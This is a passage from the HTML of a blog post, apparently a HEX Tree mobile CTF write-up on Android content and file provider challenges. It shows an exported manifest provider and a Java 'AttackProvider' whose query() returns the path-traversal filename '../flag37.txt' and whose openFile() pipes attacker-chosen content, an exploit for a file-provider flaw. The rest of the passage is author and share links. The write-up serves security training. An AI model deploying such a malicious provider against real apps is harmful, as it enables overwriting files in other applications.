</span></span><span class=line><span class=cl>    <span class=na>android:name=</span><span class=s>&#34;.AttackProvider&#34;</span>  
</span></span><span class=line><span class=cl>    <span class=na>android:authorities=</span><span class=s>&#34;ItsFadinG.github.io&#34;</span>  
</span></span><span class=line><span class=cl>    <span class=na>android:enabled=</span><span class=s>&#34;true&#34;</span>  
</span></span><span class=line><span class=cl>    <span class=na>android:exported=</span><span class=s>&#34;true&#34;</span><span class=nt>&gt;&lt;/provider&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>AttackProvider</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>ContentProvider</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>AttackProvider</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Cursor</span><span class=w> </span><span class=nf>query</span><span class=p>(</span><span class=n>Uri</span><span class=w> </span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>projection</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>selection</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>selectionArgs</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>sortOrder</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;AttackProvider&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;query(&#34;</span><span class=o>+</span><span class=n>uri</span><span class=p>.</span><span class=na>toString</span><span class=p>()</span><span class=o>+</span><span class=s>&#34;)&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>MatrixCursor</span><span class=w> </span><span class=n>cursor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>MatrixCursor</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>OpenableColumns</span><span class=p>.</span><span class=na>DISPLAY_NAME</span><span class=p>,</span><span class=w> </span><span class=n>OpenableColumns</span><span class=p>.</span><span class=na>SIZE</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>});</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>cursor</span><span class=p>.</span><span class=na>addRow</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;../flag37.txt&#34;</span><span class=p>,</span><span class=w> </span><span class=n>1337</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>});</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>cursor</span><span class=p>;</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>ParcelFileDescriptor</span><span class=w> </span><span class=nf>openFile</span><span class=p>(</span><span class=n>Uri</span><span class=w> </span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=nd>@NonNull</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>mode</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>FileNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;AttackProvider&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;openFile(&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>uri</span><span class=p>.</span><span class=na>toString</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;)&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ParcelFileDescriptor</span><span class=o>[]</span><span class=w> </span><span class=n>pipe</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ParcelFileDescriptor</span><span class=p>.</span><span class=na>createPipe</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ParcelFileDescriptor</span><span class=p>.</span><span class=na>AutoCloseOutputStream</span><span class=w> </span><span class=n>outputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ParcelFileDescriptor</span><span class=p>.</span><span class=na>AutoCloseOutputStream</span><span class=p>(</span><span class=n>pipe</span><span class=o>[</span><span class=n>1</span><span class=o>]</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>new</span><span class=w> </span><span class=n>Thread</span><span class=p>(()</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>outputStream</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=s>&#34;give flag&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>outputStream</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>Log</span><span class=p>.</span><span class=na>e</span><span class=p>(</span><span class=s>&#34;AttackProvider&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error in pipeToParcelFileDescriptor&#34;</span><span class=p>,</span><span class=w> </span><span class=n>e</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}).</span><span class=na>start</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>pipe</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>;</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileNotFoundException</span><span class=p>(</span><span class=s>&#34;Could not open pipe for: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>uri</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>delete</span><span class=p>(</span><span class=n>Uri</span><span class=w> </span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>selection</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>selectionArgs</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;AttackProvider&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;delete(&#34;</span><span class=o>+</span><span class=n>uri</span><span class=p>.</span><span class=na>toString</span><span class=p>()</span><span class=o>+</span><span class=s>&#34;)&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UnsupportedOperationException</span><span class=p>(</span><span class=s>&#34;Not yet implemented&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>getType</span><span class=p>(</span><span class=n>Uri</span><span class=w> </span><span class=n>uri</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;AttackProvider&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;getType(&#34;</span><span class=o>+</span><span class=n>uri</span><span class=p>.</span><span class=na>toString</span><span class=p>()</span><span class=o>+</span><span class=s>&#34;)&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UnsupportedOperationException</span><span class=p>(</span><span class=s>&#34;Not yet implemented&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Uri</span><span class=w> </span><span class=nf>insert</span><span class=p>(</span><span class=n>Uri</span><span class=w> </span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=n>ContentValues</span><span class=w> </span><span class=n>values</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;AttackProvider&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;insert(&#34;</span><span class=o>+</span><span class=n>uri</span><span class=p>.</span><span class=na>toString</span><span class=p>()</span><span class=o>+</span><span class=s>&#34;)&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UnsupportedOperationException</span><span class=p>(</span><span class=s>&#34;Not yet implemented&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>onCreate</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;AttackProvider&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;onCreate()&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>update</span><span class=p>(</span><span class=n>Uri</span><span class=w> </span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=n>ContentValues</span><span class=w> </span><span class=n>values</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>selection</span><span class=p>,</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                      </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>selectionArgs</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;AttackProvider&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;update(&#34;</span><span class=o>+</span><span class=n>uri</span><span class=p>.</span><span class=na>toString</span><span class=p>()</span><span class=o>+</span><span class=s>&#34;)&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UnsupportedOperationException</span><span class=p>(</span><span class=s>&#34;Not yet implemented&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><strong class="block mt-8"><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="mailto:happyk1309@gmail.com?subject=Reply%20to%20HEX%20Tree%20Content%20%26%20File%20providers%20Challenges">Reply by Email</a></strong></div><div class="flex author"><img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width=96 height=96 alt="Saeed Khalid" src=/superBLog/img/profile/theOne_hu_f3d25e422e0fbd54.jpg><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">Saeed Khalid</div><div class="text-sm text-neutral-700 dark:text-neutral-400">Just trying to have fun</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/happy-joyboy target=_blank aria-label=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://www.linkedin.com/in/saeed-khalid-awaad/ target=_blank aria-label=Linkedin rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://x.com/0badsecurity0 target=_blank aria-label=X-Twitter rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://www.youtube.com/@joyboy_404 target=_blank aria-label=Youtube rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 576 512"><path fill="currentColor" d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78.0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"/></svg></span></span></a></div></div></div></div><div class=mb-10></div><section class="flex flex-row flex-wrap justify-center pt-4 text-xl"><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://happy-joyboy.github.io/superBLog/posts/ctf/mobile/hex/hex_provider/&amp;title=HEX%20Tree%20Content%20&%20File%20providers%20Challenges" title="Share on LinkedIn" aria-label="Share on LinkedIn"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://twitter.com/intent/tweet/?url=https://happy-joyboy.github.io/superBLog/posts/ctf/mobile/hex/hex_provider/&amp;text=HEX%20Tree%20Content%20&%20File%20providers%20Challenges" title="Tweet on Twitter" aria-label="Tweet on Twitter"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://s2f.kytta.dev/?text=HEX%20Tree%20Content%20&%20File%20providers%20Challenges%20https://happy-joyboy.github.io/superBLog/posts/ctf/mobile/hex/hex_provider/" title aria-label><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M433 179.11c0-97.2-63.71-125.7-63.71-125.7-62.52-28.7-228.56-28.4-290.48.0.0.0-63.72 28.5-63.72 125.7.0 115.7-6.6 259.4 105.63 289.1 40.51 10.7 75.32 13 103.33 11.4 50.81-2.8 79.32-18.1 79.32-18.1l-1.7-36.9s-36.31 11.4-77.12 10.1c-40.41-1.4-83-4.4-89.63-54a102.54 102.54.0 01-.9-13.9c85.63 20.9 158.65 9.1 178.75 6.7 56.12-6.7 105-41.3 111.23-72.9 9.8-49.8 9-121.5 9-121.5zm-75.12 125.2h-46.63v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.33V197c0-58.5-64-56.6-64-6.9v114.2H90.19c0-122.1-5.2-147.9 18.41-175 25.9-28.9 79.82-30.8 103.83 6.1l11.6 19.5 11.6-19.5c24.11-37.1 78.12-34.8 103.83-6.1 23.71 27.3 18.4 53 18.4 175z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://reddit.com/submit/?url=https://happy-joyboy.github.io/superBLog/posts/ctf/mobile/hex/hex_provider/&amp;resubmit=true&amp;title=HEX%20Tree%20Content%20&%20File%20providers%20Challenges" title="Submit to Reddit" aria-label="Submit to Reddit"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8.0-24.9-11.1-24.9-24.6.0-13.8 11.1-24.9 24.9-24.9 13.6.0 24.6 11.1 24.6 24.9.0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4.0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8.0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7.0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9.0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5.0 52.6 59.2 95.2 132 95.2 73.1.0 132.3-42.6 132.3-95.2.0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6.0-2.2-2.2-6.1-2.2-8.3.0-2.5 2.5-2.5 6.4.0 8.6 22.8 22.8 87.3 22.8 110.2.0 2.5-2.2 2.5-6.1.0-8.6-2.2-2.2-6.1-2.2-8.3.0zm7.7-75c-13.6.0-24.6 11.1-24.6 24.9.0 13.6 11.1 24.6 24.6 24.6 13.8.0 24.9-11.1 24.9-24.6.0-13.8-11-24.9-24.9-24.9z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.facebook.com/sharer/sharer.php?u=https://happy-joyboy.github.io/superBLog/posts/ctf/mobile/hex/hex_provider/&amp;quote=HEX%20Tree%20Content%20&%20File%20providers%20Challenges" title="Share on Facebook" aria-label="Share on Facebook"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14.0 55.52 4.84 55.52 4.84v61h-31.28c-30.8.0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="mailto:?body=https://happy-joyboy.github.io/superBLog/posts/ctf/mobile/hex/hex_provider/&amp;subject=HEX%20Tree%20Content%20&%20File%20providers%20Challenges" title="Send via email" aria-label="Send via email"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1-27.64 140.9 68.65 266.2 199.1 285.1 19.01 2.888 36.17-12.26 36.17-31.49l1e-4-.6631c0-15.74-11.44-28.88-26.84-31.24-84.35-12.98-149.2-86.13-149.2-174.2.0-102.9 88.61-185.5 193.4-175.4 91.54 8.869 158.6 91.25 158.6 183.2v16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98.0036c-7.299.0-13.2 4.992-15.12 11.68-24.85-12.15-54.24-16.38-86.06-5.106-38.75 13.73-68.12 48.91-73.72 89.64-9.483 69.01 43.81 128 110.9 128 26.44.0 50.43-9.544 69.59-24.88 24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3c0-149.2-133.9-265.632-287.3-235.57zM239.1 304.3c-26.47.0-48-21.56-48-48.05s21.53-48.05 48-48.05 48 21.56 48 48.05-20.6 48.05-48 48.05z"/></svg>
